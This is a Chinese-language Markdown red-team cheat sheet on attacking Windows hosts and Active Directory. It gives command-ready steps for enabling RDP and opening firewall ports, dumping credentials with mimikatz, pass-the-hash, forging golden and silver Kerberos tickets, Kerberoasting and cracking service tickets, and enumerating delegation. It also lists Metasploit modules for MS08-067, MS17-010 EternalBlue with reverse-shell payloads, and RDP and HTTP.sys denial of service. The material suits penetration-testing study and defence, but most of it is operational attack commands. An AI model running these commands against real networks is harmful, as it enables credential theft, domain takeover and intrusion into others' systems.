# Windows 渗透

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**[RDP](#RDP)**

* [多开](#多开)
* [连接记录](#连接记录)

**[口令获取及破解](#口令获取及破解)**

* [本地](#本地)
* [域](#域)
    * [SPN扫描](#SPN扫描)
    * [PTHPTKPTT](#pthptkptt)
        * [PTH](#pth)
        * [PTT](#ptt)
    * [Kerberoast](#kerberoast)
    * [Kerberoasting](#kerberoasting)
    * [委派](#委派)
        * [查找域中委派主机或账户](#查找域中委派主机或账户)

**[漏洞利用](#漏洞利用)**

* [提权](#提权)
* [远程](#远程)
* [其他](#其他)

---

# RDP

**查看 3389 端口是否开启**

`REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /*如果是0x0则开启`

**查看远程连接的端口**

`REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber`

**cmd 开 RDP**
- 文章
    - [开启 RDP](https://b404.xyz/2017/12/27/open-RDP/)

- 命令
    - **dos 命令开启 3389 端口(开启 XP&2003 终端服务)**
        1. 方法一 : `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`

        2. 方法二 : `REG add HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /d 0 /t REG_DWORD /f`

    - **WMIC 开启 3389**

         `wmic /namespace:\\root\CIMV2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__CLASS !="") CALL SetAllowTSConnections 1`

    - **PowerShell 开启 RDP**
        1. Enable RDP : `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`

        2. Allow RDP in firewall : `Set-NetFirewallRule -Name RemoteDesktop-UserMode-In-TCP -Enabled true`

        3. Enable secure RDP authentication : `set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1`

        或

        1. Enable Remote Desktop : `(Get-WmiObject Win32_TerminalServiceSetting -Namespace root\cimv2\TerminalServices).SetAllowTsConnections(1,1) `
        `(Get-WmiObject -Class "Win32_TSGeneralSetting" -Namespace root\cimv2\TerminalServices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) `

        2. Enable the firewall rule : `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`

    - **reg 开启**
        ```
        Windows Registry Editor Version 5.00
        [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
        "fDenyTSConnections"=dword:00000000
        [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
        "PortNumber"=dword:00000d3d
        ```
        ```
        regedit /s a.reg
        ```

    - **更改终端端口为 2008(十六进制为:0x7d8)**

        1. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f`
        2. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber /t REG_DWORD /d 0x7D8 /f`

    - **查看 3389 端口是否更改**

        `REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  /*出来的结果是 16 进制`

    - **允许3389端口**
        ```
        netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
        ```

    - **取消 xp&2003 系统防火墙对终端服务的限制及 IP 连接的限制:**

        `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled :@ xpsp2res.dll,-22009 /f`

**第三方连接工具**
- [rdesktop/rdesktop](https://github.com/rdesktop/rdesktop)
- [Remmina](https://remmina.org/)
- [FreeRDP/FreeRDP](https://github.com/FreeRDP/FreeRDP)

---

## 多开
- 文章
    - [Win7 双开 3389](https://blog.csdn.net/SysProgram/article/details/11810889)
    - [渗透技巧——Windows 系统远程桌面的多用户登录](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/)
    - [Multi-User login in Windows 7/Vista/XP using Remote Desktop](http://zahirkhan.com/tools-utilities/multi-user-login-in-windows-7)

- 工具
    - [stascorp/rdpwrap](https://github.com/stascorp/rdpwrap)

- mimikatz
    ```
    privilege::debug
    ts::multirdp
    ```

- Windows Server
    ```
    win+R
    gpedit.msc
    计算机配置->管理模板->Windows 组件->远程桌面服务->远程桌面会话主机->连接
    将 "将远程桌面服务的用户限制到单独的远程桌面会话" 禁用
    ```

---

## 连接记录
- 文章
    - [渗透技巧——获得 Windows 系统的远程桌面连接历史记录](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/)
    - [关于 windows 的 RDP 连接记录](http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95/)
    - [How to Clear RDP Connections History in Windows](http://woshub.com/how-to-clear-rdp-connections-history/#h2_3)

- 工具
    - [3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)

---

# 口令获取及破解

**笔记**

关于 windows 认证的基本知识点可见笔记 [认证](../../../运维/windows/笔记/认证.md)

## 本地

**文章**
- [几种windows本地hash值获取和破解详解](https://www.secpulse.com/archives/65256.html)
- [Windows密码抓取总结](https://times0ng.github.io/2018/04/20/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/)
- [深刻理解windows安全认证机制](https://klionsec.github.io/2016/08/10/ntlm-kerberos/)
- [Windows用户密码的加密方法与破解](https://www.sqlsec.com/2019/11/winhash.html#toc-heading-2)
- [Windows下的密码hash——NTLM hash和Net-NTLM hash介绍](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/)
- [浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/)

**工具**
- [mimikatz](https://github.com/gentilkiwi/mimikatz) - 抓密码神器
    - [mimikatz](../../工具/mimikatz.md)
- [skelsec/pypykatz](https://github.com/skelsec/pypykatz) - 用纯 Python 实现的 Mimikatz
- [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne) - 凭证抓取神器
- [Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher) - 使用 WMI 提取 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft remote Desktop 等远程访问工具保存的会话信息的 ps 脚本
- [Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump) - 从 Credential Manager 中转储 Windows 凭证的 PowerShell 脚本
    ```
    set-executionpolicy remotesigned
    import-module .\Invoke-WCMDump.ps1
    invoke-wcmdump
    ```
- [SterJo Key Finder](https://www.sterjosoft.com/key-finder.html) - 找出系统中软件的序列号
- [uknowsec/SharpDecryptPwd](https://github.com/uknowsec/SharpDecryptPwd) - 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品(Xshell,Xftp)。

## 域

> 域部分内容来自 https://b404.xyz/2019/07/23/Study-Windows-Authentication/

### SPN扫描

要使用 Active Directory 作为 Kerberos 实现，可以使用 `setspn` 命令来注册 SPN。要运行此命令，必须满足下列条件：

- 必须登录到域控制器
- 必须运行提升了特权的命令提示符（以管理员身份运行）
- 必须是 Domain Admins 组的成员（或者域管理员已授予您适当的许可权）

SPN 分为两种：

- 当一个服务的权限为 Local System 或 Network Service，则 SPN 注册在域内机器帐户(Computers)下
- 当一个服务的权限为一个域用户，则 SPN 注册在域用户帐户(Users)下

SPN 对域控制器进行 LDAP 查询，是 Kerberos 的行为之一，域内的主机都能查询 SPN。

所以在域内不用做端口扫描也可以隐蔽地探测域内的服务。当利用 SPN 扫描找到域管登录过的系统，对渗透权限扩展有很大的帮助。

- AGPMServer：通常具有所有 GPO 的完全控制权。
- MSSQL/MSSQLSvc：具有管理员权限的 SQL 服务器通常会有一些有趣的数据。
- FIMService：通常对多个 AD 林具有管理权限。
- STS：VMWare SSO 服务，可以提供访问 VMWare 的后门。

对于 RC4 加密的使用 tgsrepcrack 解密

对于 AES 加密的使用 Kirbi2john 转换为 hash，通过 hashcat 爆破

**案例**

用户 AAA 要访问 MSSQL 服务的资源，进行到 Kerberos 认证的第四步(TGS-REP)时，KDC 查询 MSSQL 服务的 SPN，若该 SPN 注册在机器账户(Computers)下，TGS 将会查询数据库中所有机器账户(Computers)的 ServicePrincipalName 属性，找到对应的账户，使用该账户的 NTLM Hash 对 `Client/Server Session Key`、`Client Info`（包含Client ID）、`TimeStamp` 加密得到 `Client-To-Server Ticket`（也称为 ST 票据）。若查询服务的 SPN 注册在域用户账户(Users)下，TGS 将会查询数据库中所有域用户账户(Users)的 `ServicePrincipalName` 属性，找到对应的账户，使用该账户的 NTLM Hash 对 Client/Server Session Key、`Client Info`（包含 Client ID）、`TimeStamp` 加密得到 `Client-To-Server Ticket`（也称为 ST 票据）

**内置工具 setspn 查询**

setspn 是 Windows 内置工具，可以检索用户账户和服务之间的映射，此工具可以添加、删除、查看 SPN 的注册情况。

为账户 god.org/dbadmin 注册 SPNMSSQLSvc/SqlServer.god.org：
```
setspn -A MSSQLSvc/SqlServer.god.org dbadmin
```

查看 SPN：
```
//查看当前域内的所有SPN
setspn.exe -q */*

//查看god域内的所有SPN
setspn.exe -T god -q */*

//查看 dbadmin账户的SPN
setspn -l dbadmin
```

> 以 CN 开头的每一行代表一个账户，紧跟下面的信息是与该账户有关的SPN。

机器账户(Computers)为：
```
CN=OWA2010CN-GOD,OU=Domain Controllers,DC=god,DC=org
CN=MARY-PC,CN=Computers,DC=god,DC=org
CN=SQLSERVER,CN=Computers,DC=god,DC=org
...
```

域用户账户(Users)为：
```
CN=krbtgt,CN=Users,DC=god,DC=org
CN=dbadmin,CN=Users,DC=god,DC=org
```

> 注册在域用户账户下的 SPNMSSQLSvc/SqlServer.god.org 和 kadmin/changepw

**GetUserSPNs**
- https://github.com/nidem/kerberoast
    ```
    .\GetUserSPNs.ps1
    cscript.exe GetUserSPNs.vbs # 利用GetUserSPNs.vbs进行SPN信息查询
    ```

**PowerView**
- https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
    ```powershell
    PS C:\Users\Administrator\Desktop\Recon> Import-Module .\PowerView.ps1
    PS C:\Users\Administrator\Desktop\Recon> Get-NetUser -SPN
    ```

**Powershell AD Recon**
- https://github.com/PyroTek3/PowerShell-AD-Recon
    ```powershell
    //如查看MSSQL（其他的同理）：

    //导入脚本
    Import-Module .\Discover-PSMSSQ
    LServers.ps1
    //查找MSSQL所有实例
    Discover-PSMSSQLServers
    ```

**PowerShellery**
- https://github.com/nullbind/Powershellery
    ```powershell
    PS C:\Users\dbadmin\Desktop\Get-SPN> Import-Module .\Get-SPN.psm1
    PS C:\Users\dbadmin\Desktop\Get-SPN> Get-SPN -type service -search "*"

    //查找所有的SPN服务
    Get-SPN -type service -search "*" -List yes | Format-Table
    //查找MSSQL服务
    Get-SPN -type service -search "MSSQLSvc*" -List yes
    //若在一个非域系统上，可以使用以下命令执行
    Get-SPN -type service -search "*" -List yes -DomainController 域控IP -Credential domainuser| Format-Table -Autosize
    ```

**RiskySPN**
- https://github.com/cyberark/RiskySPN
    ```powershell
    Import-Module .\RiskySPNs.psm1
    Find-PotentiallyCrackableAccounts
    ```

**Adfind**
- http://www.joeware.net/freetools/tools/adfind/
    ```
    Adfind -f "ServicePrincipalName=MSSQLSvc*"
    Adfind -h 域控地址 -sc spn:*
    ```

### PTH/PTK/PTT

#### PTH

path-the-hash,中文直译过来就是 hash 传递，在域中是一种比较常用的攻击方式。

在内网中，获取不到明文密码，且破解不了 hash 时，可以使用 hash 传递，扩展权限。

**攻击方式**

通常来说，pass-the-hash 的攻击模式是这样的：
1. 获取一台域主机高权限
2. 利用mimikatz等工具导出密码hash
3. 用导出的hash尝试登陆其他域主机

根据 NTLM 质询/响应的过程，可以知道哈希传递就是利用对应用户名的 NTLM Hash 加密服务器生成的 Challenge（即 Response），进行比对，完成认证.

比如 SMB 可以直接基于 TCP 协议或者 NetBIOS over TCP，SMB 的认证可以基于 SMB，也可以基于 kerberos，这两种认证方式，前者本质上使用了 hash，后者本质上使用了 ticket，导致了 SMB 的 PtH 和 PtT 攻击存在的基础。

目前常用的 hash 传递工具都是通过 445 端口进行攻击的，也是因为 smb 使用了 ntml 认证，所以导致可以 hash 传递。

**文章**
- [hash传递攻击研究](http://sh1yan.top/2019/05/19/Hash-Passing-Attack-explore/)
- [Passing-the-Hash to NTLM Authenticated Web Applications](https://labs.f-secure.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/) - PTH 在 Web 应用中的应用
- [Pass the Hash with Kerberos :: malicious.link](https://malicious.link/post/2018/pass-the-hash-with-kerberos/)

**mimikatz**

mimikatz 的 PTH 相关操作见 [mimikatz 笔记](../../工具/mimikatz.md#哈希传递) 哈希传递部分

**metasploit**
```bash
use exploit/windows/smb/psexec
set rhosts <ip>
set smbuser <user>
set smbpass <password>
exploit
```

**pth-winexe**

kali 自带的 PTH 套件每个工具都针对 WIN 下相应的 EXE 文件,如使用 Pth-winexe 可以借助哈希执行程序得到一个 cmdshell:
```bash
export SMBHASH=xxxxxx...:xxxx...
pth-winexe -U administrator% //target-ip cmd
# no password 需要替换成空的 LM hash 加密值: aad3b435b51404eeaad3b435b51404ee
```

**Kerberos**
- [Pass the Hash with Kerberos](https://malicious.link/post/2018/pass-the-hash-with-kerberos/)
```bash
ktutil                      # 使用 ktutil 创建一个 keytab 文件
ktutil: addent -p uberuser@CORP.SOMEWHATREALNEWS.COM -k 1 -key -e rc4-hmac  # 指定用户和FQDN的全大写版本
Key for uberuser@CORP.SOMEWHATREALNEWS.COM (hex): 88e4d9fabaecf3dec18dd80905521b29  # 输入rc4-hmac（NTLM）哈希值
ktutil: wkt /tmp/a.keytab   # 把 keytab 文件写到磁盘上
ktutil: exit                # 退出
kinit -V -k -t /tmp/a.keytab -f uberuser@CORP.SOMEWHATREALNEWS.COM  # 使用keytab 文件创建一个kerberos ticket
klist                       # 验证
```

#### PTT

**黄金票据(Golden Tickets)**

krbtgt 账户：每个域控制器都有一个 krbtgt 的用户，是 KDC 的服务账户，用来创建票据授予服务（TGS）加密的密钥。

攻击者在获取了 krbtgt 账号的 NTLM Hash 之后，通过发送伪造的 TGT(包括 sessionkey)给 TGS 换取任意服务的Client-To-Server Ticket（ST，服务票据），从而获得域内的任意服务权限。即拥有黄金票据就拥有了域内若干权限。

黄金票据的注意事项：
- Windows 事件日志不区分 TGT 的合法性，即黄金票据的行为隐蔽性高
- 伪造黄金票据的时候，可以离线生成，减少痕迹
- krbtgt 的密码被修改了，生成的黄金票据就会失效
- 未进行 DC 生成 TGT 之前的常规验证,从而绕过了 SmartCard 身份验证要求
- KDC 会验证 TGT 中的时间戳。域策略中修改 Kerberos Policy 中的存活周期，不会影响黄金票据。
- 被冒充的账户重置密码不会影响黄金票据的使用
- 黄金票据的有效期是十年，即使域管更改了密码，也可以对域内进行十年的权限维持（除了域的认证机制改变等因素）
- 可以使用禁用、删除的帐户进行冒充，甚至是在 Active Directory 中不存在的帐户

可以通过使用 mimikatz 的 DCSync 获取伪造黄金票据需要的 krbtgt 账号的 hash。该方法中，mimikatz 会模拟域控，向目标域控请求密码账号，不用登录域控，也不用提取 NTDS.DIT 文件。但是该操作需要域管在或者其他高权限账户下进行。

使用 mimikatz 伪造的黄金票据：
```
mimikatz.exe "kerberos::golden /domain:<域名> /sid:<域SID> /rc4:<KRBTGT NTLM Hash> /user:<任意用户名> /ptt" exit
```
在数据库服务器上，利用域管理员的权限获得 krbtgt 的 NTLM 哈希 36f9d9e6d98ecf8307baf4f46ef842a2，SID 为 S-1-5-21-1812960810-2335050734-3517558805：
```
lsadump::dcsync /domain:0day.org /user:krbtgt
```

得到 krbtgt 哈希之后，使用 mimikatz 的 `kerberos::golden` 生成黄金票据 `golden.kiribi`：
```
kerberos::golden /admin:Administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi
```
`/admin` 为伪造的用户名，用户名可以任意伪造 `/domain` 为目标的域名 `/sid` 为目标域名的 SID `/krbtgt` 为 krbtgt 账户密码的 NTLM Hash `/ticket` 为要伪造的黄金票据的名称

常见域内账户 SID：
- 域用户 SID：S-1-5-21 -513
- 域管理员 SID：S-1-5-21 -512
- 架构管理员 SID：S-1-5-21 -518
- 企业管理员 SID：S-1-5-21 -519（只有在域林根域中伪造票据时才有效，用 AD 域林管理员权限添加就使用 `/sids` 参数）
- 组策略创建者所有者 SID：S-1-5-21 -520

利用 mimikatz 的 kerberos::ptt 将黄金票据 golden.kiribi 注入到内存中：
```
//清除缓存的票据
kerberos::purge
//注入黄金票据golden.kiribi
kerberos::ptt golden.kiribi
//列出票据
kerberos::list
```
> 导入的票据在20分钟内有效，过期之后再次导入就行

可以访问域控共享目录，还能在 DC 上远程执行 psexec

但是需要注意的是用 psexec 远程执行命令的时候，需要不能使用 IP 访问。使用 NetBios 的服务名访问才会走 Kerberos 认证，达到伪造凭据的攻击

- **其他途径**
    - https://pentestlab.blog/tag/dcsync/

    获取 krbtgt 账户就直接跳过获取 krbtgt 哈希的步骤。
    1. 使用 meterpreter 的 kiwi 扩展可以导出：`dcsync_ntlm krbtgt`
    2. mimikatz 可以在域控的本地安全认证(Local Security Authority)上直接读取 `mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt"`
    3. 将域控中的 ntds.dit 复制出来，使用其他工具解析

**白银票据(Silver Tickets)**

伪造的 `Client-To-Server Ticket`(也有唤作 ST 和 Service Ticket)被称为白银票据。在不与 KDC 通信情况下，通过获取 Server 端服务账号的 NTLM Hash 值，就能伪造该 Server 端服务的票据。不过在 TGT 中已包含了服务实例的唯一标识(SPN 服务)，白银票据就只能访问指定的服务。

白银票据的攻击流程：
- 获取服务端计算机的服务账号或者服务端计算机账号的 NTLM 哈希（如通过 kerberoast 获取）
- 通过 mimikatz 的 kerberos::golden 传递域 SID、目标主机名、服务名称、伪造的用户名、等信息创建白银票据
- 将票据注入到内存，并访问服务

使用 mimikatz 伪造白银票据：
```
mimikatz.exe "kerberos::golden /domain:<域名> /sid:<域 SID> /target:<目标服务器主机名> /service:<服务类型> /rc4:<NTLM Hash> /user:<用户名> /ptt" exit
```

例子：访问域控上的 cifs 服务（Windoiws 主机间的文件共享）

在域控上执行以下命令获取域控主机的本地管理员账户 NTLM Hash 为 0f6debeb6023903247c4abe5e5021e23，SID 为 S-1-5-21-1812960810-2335050734-3517558805：
```
mimikatz.exe log "privilege::debug" "sekurlsa::logonpasswords" exit
```

将生成白银票据注入到内存中,并查看票据生成情况。查看目标的文件共享服务成功：
```
kerberos::golden /domain:0day.org /target:OWA2010SP3.0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /service:cifs /rc4:0f6debeb6023903247c4abe5e5021e23 /user:FFFF /ptt /id:1183

//不加id开关也行

kerberos::golden /domain:0day.org /target:OWA2010SP3.0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /service:cifs /rc4:0f6debeb6023903247c4abe5e5021e23 /user:FFFF /ptt
```

### Kerberoast

服务票据使用服务账户的 NTLM Hash 加密，不用获取运行该服务系统的 shell，任何域用户就可以转储 Hash

在 TGS-REP 过程中，TGS 收到请求后，会将 Client-To-Server Ticket（也称为 ST 票据，Client-To-Server Ticket 由Server 密钥加密）、sessionkey_tgs 返回给 Client。当配置 Kerberos 允许的加密类型是 RC4-HMAC_MD5 时，就可以爆破 Client 端获取的 Client-To-Server Ticket，从而获得服务端服务账户的密码。

破解 Kerberos 服务票据（Client-To-Server Ticket）并重写它们，从而获得目标服务的访问权限的过程叫做 Kerberoast。该过程不需要和目标服务进行交互操作，合法访问活动目录的活动，就可以请求服务票据并导出，进行脱机破解得到服务账户的明文密码。

Kerberoast 攻击涉及五个步骤：
- SPN 扫描
- 请求 Client-To-Server Ticket
- 导出 Client-To-Server Ticket
- 破解 Client-To-Server Ticket
- 重写 Client-To-Server Ticket, 进行内存注入

进行 Kerberoast 攻击时，需要注意以下几点因素：

- 目标 SPN 服务是注册在域用户账户(Users)下
- 域用户账户的权限很高
- 密码最后设置时间
- 密码到期时间
- 最后一次登录时间
    ```
    net user administrator /domain可查看
    ```

攻击者最感兴趣的是具有高权限用户组的服务帐户如域管理员组的成员。要快速列出高权限用户组的服务帐户的方法是枚举“AdminCount” 属性等于“1”的所有帐户。攻击者只需要向 AD 请求具有 SPN 且 AdminCount = 1 的所有用户帐户。

使用 Active Directory powershell 模块（域控制器一般会安装）中的 Get-ADUser cmdlet：
```powershell
import-module ActiveDirectory
get-aduser -filter {AdminCount -eq 1 -and (servicePrincipalName -ne 0)} -prop * |select name,whencreated,pwdlastset,lastlogon
```

对于没有安装的系统，可以通过以下命令导入 Active Directory 模块:
```powershell
import-module .\Microsoft.ActiveDirectory.Management.dll
```

Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后会生成，直接在域控上环境就能扣出来

使用 gpedit.msc 将域控上的组策略管理编辑器打开,`计算机配置-->Windows设置-->安全设置-->安全选项-->"网络安全: 配置 Kerberos 允许的加密类型"`，配置 Kerberos 的加密类型为 RC4，并运行 gpupdate 更新策略

- https://github.com/nidem/kerberoast

使用 Kerberoast 中的 GeUserSPNs 进行扫描：
```
setspn.exe -q */*
或
cscript GetUserSPNs.vbs
```

请求指定的 ST 票据:
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/Srv-DB-0day.0day.org:1433"
```

或请求全部票据：
```
setspn.exe -T 0day.org -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.Post Context[0].Trim() }
```

使用 klist 命令查看当前会话存储的 Kerberos 票据：
```
klist
```

使用 mimikatz 导出内存中的票据(mimikatz 无需提权)：
```
kerberos::list /export
```

使用 https://github.com/nidem/kerberoast 工具破解，得到sqlsrv密码为Admin12345：
```
python tgsrepcrack.py dict.txt 2-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi
```

Kerberos 的票据是使用 NTLM Hash 进行签名，上述已经破解密码，就可以使用 Kerberoast 脚本重写票据，这样就可以假冒任何域用户或者虚假的账户，也可以将用户提升到域管中：
```
python kerberoast.py -p Admin12345 -r 2-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi -w test.kirbi -u 500
python kerberoast.py -p Admin12345 -r 2-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi -w test.kirbi -g 512
```

```
kerberos::ptt test.kirbi
```
攻击者知道一台服务器(或多台服务器)的服务账户和密码，就可以通过此方法将其域用户权限提升到域管。

### Kerberoasting

kerberoast 攻击，利用 mimikatz 从内存中导出票据破解。而 Kerberoasting 攻击可以不使用 mimikatz，且普通用户权限就可以实现。

- https://github.com/GhostPack/Rubeus
    ```
    Rubeus.exe kerberoast
    ```

也可以在域内一台主机上导入 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 ，以普通用户权限执行：
```powershell
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat | fl
```

只提取出hash的命令：
```powershell
Invoke-Kerberoast -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
```

使用 impacket 中的 GetUserSPN.py 也可以获取，不过需要域用户名和密码：
```powershell
GetUserSPNs.exe -request -
c-ip 192.168.3.142 0day.org/sqlsvr
```
也可以使用 https://github.com/blacklanternsecurity/Convert-Invoke-Kerberoast

使用hashcat指定字典解密：
```bash
hashcat -m 13100 hash.txt dict.txt -o /opt/dict/dist.list --force

//使用hashcat破解
hashcat64.exe -m 13100 -w 3 -a 3 -m 13100 hash -w 3 -a 3 ?l?l?l?l?l?l?l

//使用john破解

./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi > /tmp/johnkirb.txt

./john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### 委派

#### 查找域中委派主机或账户

当服务账号被设置为非约束性委派时，其 `userAccountControl` 属性会包含为 TRUSTED_FOR_DELEGATION;当被设置为约束性委派时，其 userAccountControl 属性包含 TRUSTED_TO_AUTH_FOR_DELEGATION（T2A4D），且 msDS-AllowedToDelegateTo 属性会被设置为哪些协议:

加载 powerview，查询无约束委派账户：
```powershell
Get-NetUser -Unconstrained -Domain 0day.org

//另外一个版本的Powerview
Get-DomainUser -Properties useraccountcontrol,msds-allowedtodelegateto| fl
```

加载 powerview，查询无约束委派机器：
```powershell
Get-NetComputer -Unconstrained -Domain 0day.org

//另外一个版本的Powerview
Get-DomainComputer -Unconstrained -Properties distinguishedname,useraccountcontrol -Verbose| ft -a
```

加载 powerview，枚举域内所有的服务账号，查看哪些账号被设置了委派，以及是何种类型的委派设置：
```powershell
Get-NetUser -TrustedToAuth -Domain 0day.org

Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl

Get-DomainComputer -TrustedToAuth -Domain 0day.org
```
当一个用户具备对某个服务账号的 SeEnableDelegationPrivilege 权限时，表示可以更改服务账号的委派设置，一般情况下只有域管理员才具备这个权限。因此也可以利用 SeEnableDelegationPrivilege 属性，制作极其隐蔽的后门。

**案例**

非约束委派攻击：当域控管理员访问 A 服务时，A 服务就会将访问者的 TGT 保存在内存中（此时攻击者无法访问域控），但是攻击者通过 mimikatz 的 sekurlsa::tickets /export 命令导出内存中域控管理员访问 A 服务的票据，将其注入到内存，这时候就可以访问域控。

![](../../../../assets/img/安全/笔记/RedTeam/Windows渗透/1.png)

```
kekeo.exe "tgt::ask /user:sqlsvr /domain:0day.org /password:Admin12345" exit

kekeo.exe "tgs::s4u /tgt:TGT_sqlsvr@0DAY.ORG_krbtgt~0day.org@0DAY.ORG.kirbi /user:administrator@0day.org /service:/service:service_to_access" exit


Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:service_to_access
```

---

# 漏洞利用

**资源**
- [SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits) - Windows 平台提权漏洞集合
- [WindowsExploits/Exploits](https://github.com/WindowsExploits/Exploits)- Windows Exploits

---

## 提权

关于 windows 更多提权内容,见笔记 [提权](./提权.md#win) windows 提权部分

---

## 远程

**MS08-067 & CVE-2008-4250**
- MSF 模块
    ```bash
    use exploit/windows/smb/ms08_067_netapi
    set payload windows/x64/meterpreter/reverse_tcp
    set target 0
    ```

**MS12-020 & CVE-2012-0002**
- MSF 模块
    ```bash
    use auxiliary/scanner/rdp/ms12_020_check
    use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
    ```

**MS14-066 & CVE-2014-6321**
- POC | Payload | exp
    - [anexia-it/winshock-test](https://github.com/anexia-it/winshock-test)

**MS15-034 & CVE-2015-1635**
- POC | Payload | exp
    - [MS15-034 Checker](https://pastebin.com/ypURDPc4)

- 文章
    - [MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析](http://blogs.360.cn/post/cve_2015_6135_http_rce_analysis.html)

- MSF 模块
    ```bash
    use auxiliary/scanner/http/ms15_034_http_sys_memory_dump    # 读取服务器内存数据
    use auxiliary/dos/http/ms15_034_ulonglongadd    # 进行 dos 攻击
    ```

**MS17-010**
- MSF 模块
    ```bash
    # 发现,检测
    use auxiliary/scanner/smb/smb_ms17_010
    set rhosts <ip>
    run

    # 使用 payload 连上去
    use exploit/windows/smb/ms17_010_eternalblue
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost <ip>      # 设置回弹地址
    set rhosts <ip>
    run

    # msf 下加载 mimikatz 模块
    load mimikatz
    kerberos
    ```

- 修复工具
    - ["永恒之蓝"勒索蠕虫漏洞修复工具](https://www.qianxin.com/other/wannacryfix)

**bluekeep & CVE-2019-0708**
- 文章
    - [RDP Stands for "Really DO Patch!" – Understanding the Wormable RDP Vulnerability CVE-2019-0708](https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/)
    - [worawit/CVE-2019-0708](https://github.com/worawit/CVE-2019-0708/blob/master/NOTE.md)

- POC | Payload | exp
    - [zerosum0x0/CVE-2019-0708](https://github.com/zerosum0x0/CVE-2019-0708)
    - [robertdavidgraham/rdpscan](https://github.com/robertdavidgraham/rdpscan)
